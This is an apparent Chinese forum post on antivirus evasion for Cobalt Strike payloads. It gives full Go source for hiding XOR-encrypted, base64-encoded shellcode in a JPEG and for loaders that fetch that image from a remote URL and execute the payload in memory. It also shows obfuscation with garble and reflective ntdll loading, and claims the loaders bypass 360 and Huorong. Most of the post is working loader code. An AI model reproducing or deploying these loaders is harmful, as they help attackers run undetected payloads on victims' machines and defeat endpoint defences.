CS 免杀学习
=======

前言
--

一直没有用go写过免杀，但是看github的很多BypassAV项目很多都是使用golang进行开发免杀，因此这里也是通过学习一种免杀的思路--分离免杀的方式来实践一下，其实免杀思路也是很简单，鉴于目前杀毒软件仍旧以特征库为主，将病毒代码体(shellcode)和执行体(loader)分离，从而规避特征免杀达到免杀的目的

项目地址:<https://github.com/crisprss/sucksAV>

shellcode加载到图片中
---------------

至于加密方式，这里使用最简单的异或加密，即将`shellcode`以异或的方式嵌入到图片文件中，最后加载出来时再通过异或的方式解密得到原始的`shellcode`

因此我们首先需要一个用于生成图片马，得到图片马之后还需要保证我们的图片在远程的时候是没有被压缩的，否则shellcode很可能就提取不出来导致无法成功上线

这里贴下简单的`generate.go`:

```golo=
package main

import (
    "encoding/base64"
    "fmt"
    "os"
)

const (
    KEY_1 = 22 //第一次异或的KEY
    KEY_2 = 44 // 第二次异或的KEY
)

func main() {
    var xor_shellcode []byte
    xor_shellcode = []byte{"java_shellcode"}
    var shellcode []byte
    for i := 0; i < len(xor_shellcode); i++ {
        //这里将真正的shellcode进行异或加密再给shellcode切片
        shellcode = append(shellcode, xor_shellcode[i]^KEY_1^KEY_2)
    }
    //进行base64加密 准备写入jpeg中
    encodeBaseStr := base64.StdEncoding.EncodeToString(shellcode)
    fileName := os.Args[1]
    if len(fileName) == 0 {
        fmt.Println("[-]usage:run generate.go pic_path")
        os.Exit(0)
    }
    //创建一个文件并且追加内容
    f, err := os.OpenFile(fileName, os.O_CREATE|os.O_RDWR|os.O_APPEND, os.ModeAppend|os.ModePerm)
    if err != nil {
        fmt.Println(err)
    }
    //将异或加密并且base64后的shellcode追加写入到图片最后
    f.WriteString(encodeBaseStr)
    f.Close()
    fmt.Println("write success")
}
```

注意这里最好是选取jpeg图片,之前尝试使用png图片是失败的，因为在识别抽取shellcode是通过**jpeg的EOF**即`ffd9`实现的

> 注意:`jpeg`图片以ffd8开头并且以ffd9结尾

远程提取shellcode并在内存执行
-------------------

这里思路也比较简单，首先通过GET方式将图片的数据读取,然后判断jpeg图片的EOF即`ffd9` 转换成十进制就是`255 217` ，当识别到EOF后那么后面的自然就是经过异或加密的base64后的shellcode，将其提取出来之后我们开辟一个代码可执行的内存空间，填入我们前面使用KEY和base64decode解密后的`shellcode`，最终调用`syscall.Syscall`执行

贴一下最后的代码:

```golo=
package main

import (
    "encoding/base64"
    "fmt"
    "io/ioutil"
    "net/http"
    "os"
    "syscall"
    "unsafe"
)

const (
    KEY_1 = 22
    KEY_2 = 44
    //配置堆属性
    MEM_COMMIT             = 0x1000
    MEM_RESERVE            = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40 // 区域可以执行代码，应用程序可以读写该区域。
)

var (
    kernel32      = syscall.MustLoadDLL("kernel32.dll")
    ntdll         = syscall.MustLoadDLL("ntdll.dll")
    VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
    RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func main() {
    imageUrl := "https://xxxx/xx.jpeg"
    res, err := http.Get(imageUrl)
    if err != nil {
        os.Exit(0)
    }
    body, err := ioutil.ReadAll(res.Body)
    res.Body.Close()
    //下面判断Jpeg结尾的ffd9
    idx := 0
    for i := 0; i < len(body); i++ {
        if body[idx] == 255 && body[idx+1] == 217 {
            break
        } else if idx == len(body)-1 {
            fmt.Print("shell png is not correct!")
            os.Exit(1)
        }
        idx++
    }
    base64Str := string(body[idx+2:])
    //fmt.Print(base64Str)
    xor_shellcode, err := base64.StdEncoding.DecodeString(base64Str)
    if err != nil {
        fmt.Print(err.Error())
    }
    //fmt.Print(xor_shellcode)
    var shellcode []byte
    for i := 0; i < len(xor_shellcode); i++ {
        shellcode = append(shellcode, xor_shellcode[i]^KEY_1^KEY_2)
    }
    //开始分配空间 并且将shellcode写入内存中执行
    addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if err != nil && err.Error() != "The operation completed successfully." {
        fmt.Println(err.Error())
        os.Exit(1)
    }
    _, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
    if err != nil && err.Error() != "The operation completed successfully." {
        fmt.Print(err.Error())
        os.Exit(1)
    }
    syscall.Syscall(addr, 0, 0, 0, 0)
}
```

这里测试一下免杀效果:  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3e1474cf3754586fc8486b23973ee014bc3df6a6.png)

在VT中是会被FireEye检测，但是火绒却没有报错，火绒应该也是使用了FireEye引擎的，这里比较不解，希望师傅们能够指点下  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2e5b300f1277422746a715b6e5a07cd414bbdbce.png)

静态免杀优化
------

相对于动态查杀的绕过，静态免杀的优化还是比较简单，这里为了多熟悉Golang的相关特性，我首先使用了[garble](https://github.com/burrowers/garble)这个项目对Golang在语言上进行混淆，该混淆的点有如下:

```php
用短的 base64 哈希替换尽可能多的有用标识符
用短的 base64 哈希替换包路径
删除所有构建和模块信息
剥离文件名和随机位置信息
通过以下方式剥离调试信息和符号表 -ldflags="-w -s"
混淆文字，如果-literals给出了标志
删除额外信息（如果-tiny给出了标志）
```

当使用garble进行build编译后，相比于之前的免杀效果我们可以明显的看到:  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cc856c3696c67ae64e4d9173b4c571016a2ae1cd.png)

仅仅是通过混淆，便可以起到比较大幅度的免杀效果

反射加载库函数
-------

在Golang中同样可以使用反射加载技术，反射加载我的理解是过动态获取相应dll的基址，来动态获取相应API的地址进而来调用相应的API，从而隐藏导入表中暴露的API

这样能够达到比较好的效果，在这里我将`RtlCopyMemory`通过反射的方式调用，并且使用HeapCreate函数来代替VirtualAlloc函数，最后在使用`Garble`方式进行混淆后我们可以发现:  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-48a8f559803260ca36f5647b5d6e206ae9c841c6.png)  
免杀效果又比之前直接进行混淆的效果更好，不过以上所有的实现均能够直接绕过360+火绒

贴一下实现的源码:

```golo=
package main

import (
    "encoding/base64"
    "fmt"
    "io/ioutil"
    "log"
    "net/http"
    "os"
    "syscall"
    "unsafe"

    "github.com/Binject/universal"
)

var (
    kernel32   = syscall.MustLoadDLL("kernel32.dll")
    HeapCreate = kernel32.MustFindProc("HeapCreate")
)

const (
    KEY_1 = 22
    KEY_2 = 44
    //配置堆属性
    MEM_COMMIT                 = 0x1000
    MEM_RESERVE                = 0x2000
    PAGE_EXECUTE_READWRITE     = 0x40 // 区域可以执行代码，应用程序可以读写该区域。
    HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
)

func main() {
    var ntdll_image []byte

    var err error
    ntdll_image, err = ioutil.ReadFile("C:\\Windows\\System32\\ntdll.dll")

    ntdll_loader, err := universal.NewLoader()

    if err != nil {
        log.Fatal(err)
    }

    ntdll_library, err := ntdll_loader.LoadLibrary("main", &ntdll_image)

    if err != nil {
        log.Fatal(err)
    }

    imageUrl := "未压缩的图片url"
    res, err := http.Get(imageUrl)
    if err != nil {
        os.Exit(0)
    }
    body, err := ioutil.ReadAll(res.Body)
    res.Body.Close()
    //下面判断Jpeg结尾的ffd9
    idx := 0
    for i := 0; i < len(body); i++ {
        if body[idx] == 255 && body[idx+1] == 217 {
            break
        } else if idx == len(body)-1 {
            fmt.Print("shell png is not correct!")
            os.Exit(1)
        }
        idx++
    }
    base64Str := string(body[idx+2:])
    //fmt.Print(base64Str)
    xor_shellcode, err := base64.StdEncoding.DecodeString(base64Str)
    if err != nil {
        fmt.Print(err.Error())
    }
    //fmt.Print(xor_shellcode)
    var shellcode []byte
    for i := 0; i < len(xor_shellcode); i++ {
        shellcode = append(shellcode, xor_shellcode[i]^KEY_1^KEY_2)
    }
    //开始分配空间 并且将shellcode写入内存中执行
    addr, _, err := HeapCreate.Call(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)

    _, err = ntdll_library.Call("RtlCopyMemory", addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
    if err != nil {
        fmt.Printf("false")
    }

    syscall.Syscall(addr, 0, 0, 0, 0)
}
```